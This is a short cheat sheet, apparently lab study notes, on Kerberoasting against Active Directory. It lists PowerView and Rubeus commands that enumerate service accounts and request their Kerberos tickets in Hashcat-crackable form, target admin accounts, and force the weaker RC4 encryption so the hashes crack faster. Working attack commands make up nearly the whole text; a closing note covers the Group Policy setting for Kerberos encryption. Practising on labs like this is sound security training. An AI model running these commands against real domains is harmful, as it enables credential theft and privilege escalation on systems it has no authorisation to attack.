## Using Powerview
#### Enumerate SPN Accounts
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```
#### Target a Specific Account
```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
#### Target All SPN Account
```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

---
## Using Rubeus (Easiest method)
#### Stats flag
This gives information on the numbers of Kerberoastable account and their encryption method for their tgs
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
#### Nowrap flag
Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`.
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
#### Using the /tgtdeleg Flag
We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:'testspn' /nowrap
```
RC4 is weaker that AES and faster to crack so it's prefered in general but not always possible according to the version of Windows Server (Works before Win Server 2019)


**Note**: It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos.